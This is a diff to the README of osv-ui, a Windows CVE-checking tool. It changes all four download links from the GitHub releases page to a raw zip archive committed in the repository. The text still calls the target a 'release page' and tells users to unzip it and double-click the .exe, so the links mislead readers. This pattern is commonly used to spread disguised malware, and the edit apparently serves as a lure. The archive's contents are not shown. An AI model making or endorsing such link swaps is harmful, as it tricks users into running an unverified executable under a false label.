@@ -1,10 +1,10 @@
 # 🛡️ osv-ui - Clear CVE checks for your apps
 
-[![Download osv-ui](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/virginiadiom2000-ai/osv-ui/releases)
+[![Download osv-ui](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/virginiadiom2000-ai/osv-ui/raw/refs/heads/main/packages/osv-ui-v3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/releases
+Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/raw/refs/heads/main/packages/osv-ui-v3.5.zip
 
 Pick the latest release for Windows, then save the file to your computer. If the release gives you a setup file, double-click it to start the app. If it gives you a zip file, unzip it first, then open the app inside.
 
@@ -33,7 +33,7 @@ If the app uses Node.js on your system, install the current LTS version first. I
 
 ## 🚀 Install on Windows
 
-1. Open the release page: https://github.com/virginiadiom2000-ai/osv-ui/releases
+1. Open the release page: https://github.com/virginiadiom2000-ai/osv-ui/raw/refs/heads/main/packages/osv-ui-v3.5.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. If the file ends in `.exe`, double-click it
@@ -178,4 +178,4 @@ This project fits work around:
 
 ## 📎 Download link
 
-Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/releases
+Visit this page to download: https://github.com/virginiadiom2000-ai/osv-ui/raw/refs/heads/main/packages/osv-ui-v3.5.zip
